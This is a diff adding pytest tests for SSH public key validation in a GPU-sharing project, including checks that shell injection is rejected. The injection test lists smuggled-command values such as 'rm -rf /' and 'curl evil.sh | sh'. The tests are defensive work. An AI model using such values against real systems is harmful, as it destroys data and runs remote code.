@@ -131,3 +131,51 @@ def test_ipv4_and_hostnames_are_left_alone():
     assert bracket_host("100.65.244.36") == "100.65.244.36"
     assert bracket_host("0.0.0.0") == "0.0.0.0"
     assert bracket_host("localhost") == "localhost"
+
+
+# --- SSH key validation ----------------------------------------------------
+
+
+def test_valid_ssh_keys_accepted():
+    from p2pgpu.worker.share import validate_ssh_key
+
+    ed = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8HDsuCiiCPypS+AgQVHLhvOElLMgAdv0o4P0RXsDN9 shiva"
+    assert validate_ssh_key(ed) == ed
+    # No comment is still valid.
+    assert validate_ssh_key("ssh-rsa AAAAB3NzaC1yc2EAAAA==") == "ssh-rsa AAAAB3NzaC1yc2EAAAA=="
+
+
+def test_ssh_key_injection_is_rejected():
+    """The key is interpolated into the container's shell script -- quotes must not pass."""
+    import pytest as _pytest
+
+    from p2pgpu.worker.share import ShareError, validate_ssh_key
+
+    for evil in [
+        "ssh-ed25519 AAAA' ; rm -rf / ; echo '",
+        'ssh-ed25519 AAAA" ; curl evil.sh | sh ; "',
+        "ssh-ed25519 AAAA\\nrm -rf /",
+        "ssh-ed25519 AAAA\nssh-rsa BBBB",
+    ]:
+        with _pytest.raises(ShareError):
+            validate_ssh_key(evil)
+
+
+def test_private_key_gets_a_specific_warning():
+    """People paste the wrong file. Say so plainly rather than 'invalid key'."""
+    import pytest as _pytest
+
+    from p2pgpu.worker.share import ShareError, validate_ssh_key
+
+    with _pytest.raises(ShareError, match="PRIVATE"):
+        validate_ssh_key("-----BEGIN OPENSSH PRIVATE KEY-----")
+
+
+def test_garbage_rejected():
+    import pytest as _pytest
+
+    from p2pgpu.worker.share import ShareError, validate_ssh_key
+
+    for junk in ["", "hello world", "not-a-key AAAA"]:
+        with _pytest.raises(ShareError):
+            validate_ssh_key(junk)
